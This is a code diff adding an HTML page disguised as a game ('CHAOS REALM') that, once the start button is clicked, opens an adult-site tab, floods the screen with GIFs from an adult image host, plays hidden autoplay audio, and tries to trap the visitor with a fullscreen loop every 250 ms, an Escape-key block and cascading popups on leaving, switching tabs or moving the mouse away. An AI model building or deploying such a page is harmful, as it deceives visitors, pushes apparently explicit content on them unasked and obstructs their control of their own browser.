@@ -1,0 +1,540 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>GIF Chaos Page</title>
+  <style>
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+    }
+
+    html, body {
+      width: 100%;
+      height: 100%;
+      overflow: hidden;
+      font-family: Arial, sans-serif;
+    }
+
+    #mainPage {
+      width: 100%;
+      height: 100%;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      flex-direction: column;
+      background: url('https://i.imgur.com/0SeeTfG.png') center/cover;
+      position: relative;
+      overflow: hidden;
+    }
+
+    #mainPage::before {
+      content: '';
+      position: absolute;
+      top: 0;
+      left: 0;
+      right: 0;
+      bottom: 0;
+      background: rgba(0, 0, 0, 0.5);
+      z-index: 0;
+    }
+
+    .main-content {
+      position: relative;
+      z-index: 10;
+      text-align: center;
+      padding: 40px;
+      background: rgba(0, 0, 0, 0.3);
+      border-radius: 20px;
+      backdrop-filter: blur(10px);
+      border: 2px solid rgba(255, 255, 255, 0.1);
+    }
+
+    .game-title {
+      font-size: 4rem;
+      font-weight: 900;
+      background: linear-gradient(45deg, #ff6b6b, #ffd93d, #6bcf7f, #4d79ff);
+      background-size: 400% 400%;
+      -webkit-background-clip: text;
+      -webkit-text-fill-color: transparent;
+      background-clip: text;
+      animation: gradientShift 3s ease-in-out infinite;
+      margin-bottom: 20px;
+      text-shadow: 0 0 30px rgba(255, 107, 107, 0.5);
+      letter-spacing: 3px;
+    }
+
+    .game-subtitle {
+      color: #ffffff;
+      font-size: 1.5rem;
+      margin-bottom: 30px;
+      opacity: 0.9;
+      font-weight: 300;
+      letter-spacing: 1px;
+    }
+
+    @keyframes gradientShift {
+      0% { background-position: 0% 50%; }
+      50% { background-position: 100% 50%; }
+      100% { background-position: 0% 50%; }
+    }
+
+    @keyframes float {
+      0%, 100% { transform: translateY(0px); }
+      50% { transform: translateY(-20px); }
+    }
+
+    @keyframes pulse {
+      0%, 100% { transform: scale(1); }
+      50% { transform: scale(1.05); }
+    }
+
+    .floating-particles {
+      position: absolute;
+      width: 100%;
+      height: 100%;
+      overflow: hidden;
+      z-index: 1;
+    }
+
+    .particle {
+      position: absolute;
+      background: rgba(255, 255, 255, 0.1);
+      border-radius: 50%;
+      animation: floatParticle 15s infinite linear;
+    }
+
+    @keyframes floatParticle {
+      0% {
+        transform: translateY(100vh) rotate(0deg);
+        opacity: 0;
+      }
+      10% {
+        opacity: 1;
+      }
+      90% {
+        opacity: 1;
+      }
+      100% {
+        transform: translateY(-100px) rotate(360deg);
+        opacity: 0;
+      }
+    }
+
+    #videoPage {
+      width: 100%;
+      height: 100%;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      flex-direction: column;
+    }
+
+    .nav-button {
+      background: linear-gradient(45deg, #ff6b6b, #ff8e8e, #ff4757);
+      color: white;
+      border: none;
+      padding: 20px 50px;
+      font-size: 1.4rem;
+      font-weight: bold;
+      border-radius: 50px;
+      cursor: pointer;
+      transition: all 0.3s ease;
+      box-shadow: 0 8px 25px 0 rgba(255, 107, 107, 0.4);
+      text-transform: uppercase;
+      letter-spacing: 2px;
+      z-index: 1000;
+      position: relative;
+      overflow: hidden;
+      animation: pulse 2s infinite;
+    }
+
+    .nav-button::before {
+      content: '';
+      position: absolute;
+      top: 0;
+      left: -100%;
+      width: 100%;
+      height: 100%;
+      background: linear-gradient(90deg, transparent, rgba(255, 255, 255, 0.3), transparent);
+      transition: left 0.5s;
+    }
+
+    .nav-button:hover::before {
+      left: 100%;
+    }
+
+    .nav-button:hover {
+      transform: translateY(-5px) scale(1.05);
+      box-shadow: 0 15px 35px 0 rgba(255, 107, 107, 0.8);
+      text-shadow: 0 0 20px rgba(255, 255, 255, 0.8);
+    }
+
+    .nav-button:active {
+      transform: translateY(-2px) scale(1.02);
+    }
+
+    .fullscreen-gif {
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100vw;
+      height: 100vh;
+      object-fit: cover;
+      z-index: 0;
+    }
+
+    .flying-gif {
+      position: fixed;
+      width: 300px;
+      z-index: 999;
+      transition: transform 4s linear;
+      pointer-events: none;
+    }
+
+    .flying-gif1 {
+      position: fixed;
+      width: 400px;
+      z-index: 999;
+      transition: transform 4s linear;
+      pointer-events: none;
+    }
+
+    .flying-gif2 {
+      position: fixed;
+      width: 500px;
+      z-index: 999;
+      transition: transform 4s linear;
+      pointer-events: none;
+    }
+
+    .flying-gif3 {
+      position: fixed;
+      width: 600px;
+      z-index: 999;
+      transition: transform 4s linear;
+      pointer-events: none;
+    }
+
+    #soundcloud-player {
+      position: fixed;
+      top: -9999px;
+      left: -9999px;
+      width: 1px;
+      height: 1px;
+      opacity: 0;
+      pointer-events: none;
+    }
+
+  </style>
+</head>
+<body>
+
+  <!-- Main Page -->
+  <div id="mainPage">
+    <div class="floating-particles"></div>
+    <div class="main-content">
+      <h1 class="game-title">CHAOS REALM</h1>
+      <p class="game-subtitle">Enter if you dare... Reality awaits destruction</p>
+      <button class="nav-button" onclick="startShow()">🎮 START GAME 🎮</button>
+    </div>
+  </div>
+
+  <!-- GIF Chaos Page -->
+  <div id="videoPage" style="display: none;">
+    <img
+      id="mainGif"
+      class="fullscreen-gif"
+      src="https://cdnc.imagefap.com/images/full/61/804/80417348.gif?secure=03X4_jYycVZzJ6In1Cti9w==,1748654693"
+      alt="Fullscreen Chaos"
+    />
+    <!-- SoundCloud player - hidden but functional -->
+    <iframe 
+      id="soundcloud-player"
+      width="300" 
+      height="166" 
+      scrolling="no" 
+      frameborder="no" 
+      allow="autoplay" 
+      src="https://w.soundcloud.com/player/?url=https%3A//soundcloud.com/youssef-you-815123367/quash&color=%23ff5500&auto_play=true&hide_related=true&show_comments=false&show_user=false&show_reposts=false&show_teaser=false&visual=false">
+    </iframe>
+  </div>
+
+  <script>
+    let isOnGifPage = false;
+    let soundcloudWidget;
+    let volumeBoostInterval;
+
+    function startShow() {
+      // Create floating particles effect
+      createFloatingParticles();
+      
+      // User interaction triggered - we can now play audio immediately
+      setTimeout(() => {
+        document.getElementById('mainPage').style.display = 'none';
+        document.getElementById('videoPage').style.display = 'flex';
+        isOnGifPage = true;
+
+        // Request fullscreen immediately
+        const container = document.getElementById('videoPage');
+        if (container.requestFullscreen) {
+          container.requestFullscreen().catch(() => {});
+        } else if (container.webkitRequestFullscreen) {
+          container.webkitRequestFullscreen();
+        } else if (container.mozRequestFullScreen) {
+          container.mozRequestFullScreen();
+        }
+
+        // Initialize SoundCloud player
+        initializeSoundCloud();
+        goToGifPage();
+      }, 1000); // 1 second delay for dramatic effect
+    }
+
+    // Create floating particles for the main page
+    function createFloatingParticles() {
+      const particleContainer = document.querySelector('.floating-particles');
+      
+      for (let i = 0; i < 50; i++) {
+        const particle = document.createElement('div');
+        particle.className = 'particle';
+        particle.style.left = Math.random() * 100 + '%';
+        particle.style.width = particle.style.height = Math.random() * 4 + 2 + 'px';
+        particle.style.animationDelay = Math.random() * 15 + 's';
+        particle.style.animationDuration = (Math.random() * 10 + 10) + 's';
+        particleContainer.appendChild(particle);
+      }
+    }
+
+    // Initialize particles on page load
+    window.addEventListener('load', createFloatingParticles);
+
+    // Initialize SoundCloud - hidden but functional
+    function initializeSoundCloud() {
+      // The iframe will handle autoplay in the background
+      console.log('SoundCloud player initialized with hidden autoplay');
+    }
+
+    function goToGifPage() {
+      // Open new tab immediately
+      window.open('https://motherless.com/B924E6B', '_blank');
+
+      // SoundCloud should start automatically via iframe autoplay
+      console.log('Show started - SoundCloud should be playing');
+
+      // Create flying GIFs
+      createFlyingGifs();
+      createFlyingGifs1();
+      createFlyingGifs2();
+      createFlyingGifs3();
+
+      // Create more GIFs periodically
+      setInterval(createFlyingGifs, 5000);
+      
+      // Keep requesting fullscreen in case it fails - SUPER AGGRESSIVE LOOP
+      setInterval(() => {
+        const container = document.getElementById('videoPage');
+        if (!document.fullscreenElement && !document.webkitFullscreenElement && !document.mozFullScreenElement) {
+          if (container.requestFullscreen) {
+            container.requestFullscreen().catch(() => {});
+          } else if (container.webkitRequestFullscreen) {
+            container.webkitRequestFullscreen();
+          } else if (container.mozRequestFullScreen) {
+            container.mozRequestFullScreen();
+          }
+        }
+      }, 250); // Check every 0.25 seconds for maximum persistence
+      
+      // Additional aggressive fullscreen enforcement
+      document.addEventListener('fullscreenchange', () => {
+        if (!document.fullscreenElement) {
+          setTimeout(() => {
+            const container = document.getElementById('videoPage');
+            if (container.requestFullscreen) {
+              container.requestFullscreen().catch(() => {});
+            }
+          }, 100);
+        }
+      });
+      
+      // Block escape key to prevent fullscreen exit
+      document.addEventListener('keydown', (e) => {
+        if (e.key === 'Escape' && isOnGifPage) {
+          e.preventDefault();
+          return false;
+        }
+      });
+    }
+    
+    function createFlyingGifs() {
+      for (let i = 0; i < 20; i++) {
+        const gif = document.createElement('img');
+        gif.src = 'https://cdnc.imagefap.com/images/full/61/119/1192141950.gif?secure=5D2uaxIik2R2xvM5bxyoCw==,1748654693';
+        gif.className = 'flying-gif';
+        gif.style.top = `${Math.random() * 90}%`;
+        gif.style.left = `${Math.random() * 90}%`;
+        gif.style.width = `${Math.random() * 150 + 50}px`;
+        document.body.appendChild(gif);
+
+        setTimeout(() => {
+          gif.style.transform = `translate(${Math.random() * 1000 - 500}px, ${Math.random() * 1000 - 500}px) rotate(${Math.random() * 360}deg)`;
+          
+          // Remove old GIFs to prevent memory issues
+          setTimeout(() => {
+            if (gif.parentNode) {
+              gif.parentNode.removeChild(gif);
+            }
+          }, 4000);
+        }, 100 + i * 50);
+      }
+    }
+
+    function createFlyingGifs1() {
+      for (let i = 0; i < 20; i++) {
+        const gif = document.createElement('img');
+        gif.src = 'https://cdnc.imagefap.com/images/full/117/335/335901094.gif?secure=IrnWMV_KwQv6Bw6y0dG0gQ==,1748654928';
+        gif.className = 'flying-gif1';
+        gif.style.top = `${Math.random() * 90}%`;
+        gif.style.left = `${Math.random() * 90}%`;
+        gif.style.width = `${Math.random() * 150 + 50}px`;
+        document.body.appendChild(gif);
+
+        setTimeout(() => {
+          gif.style.transform = `translate(${Math.random() * 1000 - 500}px, ${Math.random() * 1000 - 500}px) rotate(${Math.random() * 360}deg)`;
+          
+          // Remove old GIFs to prevent memory issues
+          setTimeout(() => {
+            if (gif.parentNode) {
+              gif.parentNode.removeChild(gif);
+            }
+          }, 4000);
+        }, 100 + i * 50);
+      }
+    }
+
+    function createFlyingGifs2() {
+      for (let i = 0; i < 20; i++) {
+        const gif = document.createElement('img');
+        gif.src = 'https://cdnc.imagefap.com/images/full/117/119/1197093274.gif?secure=WECcjl25dHaY7wtWJymmFg==,1748654928';
+        gif.className = 'flying-gif2';
+        gif.style.top = `${Math.random() * 90}%`;
+        gif.style.left = `${Math.random() * 90}%`;
+        gif.style.width = `${Math.random() * 150 + 50}px`;
+        document.body.appendChild(gif);
+
+        setTimeout(() => {
+          gif.style.transform = `translate(${Math.random() * 1000 - 500}px, ${Math.random() * 1000 - 500}px) rotate(${Math.random() * 360}deg)`;
+          
+          // Remove old GIFs to prevent memory issues
+          setTimeout(() => {
+            if (gif.parentNode) {
+              gif.parentNode.removeChild(gif);
+            }
+          }, 4000);
+        }, 100 + i * 50);
+      }
+    }
+
+    function createFlyingGifs3() {
+      for (let i = 0; i < 20; i++) {
+        const gif = document.createElement('img');
+        gif.src = 'https://cdnc.imagefap.com/images/full/117/207/2072686031.gif?secure=msA60Jupi70tgqZGz--RmQ==,1748654928';
+        gif.className = 'flying-gif3';
+        gif.style.top = `${Math.random() * 90}%`;
+        gif.style.left = `${Math.random() * 90}%`;
+        gif.style.width = `${Math.random() * 150 + 50}px`;
+        document.body.appendChild(gif);
+
+        setTimeout(() => {
+          gif.style.transform = `translate(${Math.random() * 1000 - 500}px, ${Math.random() * 1000 - 500}px) rotate(${Math.random() * 360}deg)`;
+          
+          // Remove old GIFs to prevent memory issues
+          setTimeout(() => {
+            if (gif.parentNode) {
+              gif.parentNode.removeChild(gif);
+            }
+          }, 4000);
+        }, 100 + i * 50);
+      }
+    }
+
+    // ULTRA HARDCORE popup system for maximum website retention
+    let popupCount = 0;
+    const popupMessages = [
+      "🚫 WAIT! Don't leave the chaos!",
+      "❌ Are you absolutely sure?",
+      "⚠️ The GIFs will miss you!",
+      "💥 Last chance to stay!",
+      "🔥 Think about the awesome content!",
+      "⭐ You're really going to abandon this masterpiece?",
+      "🎭 The chaos needs you!",
+      "🌟 Don't give up on the experience!",
+      "🎪 The show must go on!",
+      "🎨 Art like this is rare!",
+      "🎯 One more chance to reconsider?",
+      "🎊 Final warning: you'll regret leaving!",
+      "💎 This is premium entertainment!",
+      "🏆 Champions don't quit!",
+      "🚀 We're just getting started!"
+    ];
+
+    // Multi-step unload confirmation with EXTREME persistence
+    window.onbeforeunload = function (e) {
+      if (!isOnGifPage) return;
+
+      e.preventDefault();
+      e.returnValue = '🔥 THE CHAOS SHOW IS JUST BEGINNING! 🔥';
+
+      // Cascade of popups
+      setTimeout(() => {
+        for (let i = 0; i < 15; i++) {
+          setTimeout(() => {
+            if (popupCount < popupMessages.length) {
+              const userChoice = confirm(popupMessages[popupCount]);
+              popupCount++;
+              if (userChoice) {
+                // If they click OK, show more popups
+                setTimeout(() => {
+                  alert("Great choice! The chaos continues! 🎉");
+                }, 100);
+              }
+            }
+          }, i * 800); // 0.8 second delay between each popup
+        }
+      }, 0);
+
+      return '🔥 THE CHAOS SHOW IS JUST BEGINNING! 🔥';
+    };
+
+    // Additional popup triggers
+    document.addEventListener('visibilitychange', () => {
+      if (document.hidden && isOnGifPage) {
+        setTimeout(() => {
+          if (confirm("🔍 We noticed you switched tabs! Come back to the chaos! 🔍")) {
+            window.focus();
+          }
+        }, 1000);
+      }
+    });
+
+    // Popup when mouse leaves window
+    document.addEventListener('mouseleave', () => {
+      if (isOnGifPage && Math.random() > 0.7) { // 30% chance
+        setTimeout(() => {
+          alert("🖱️ Don't move that mouse away! The chaos needs your attention! 🖱️");
+        }, 500);
+      }
+    });
+
+    // Clean up interval when leaving
+    window.addEventListener('unload', function() {
+      if (volumeBoostInterval) {
+        clearInterval(volumeBoostInterval);
+      }
+    });
+  </script>
+
+</body>
+</html>
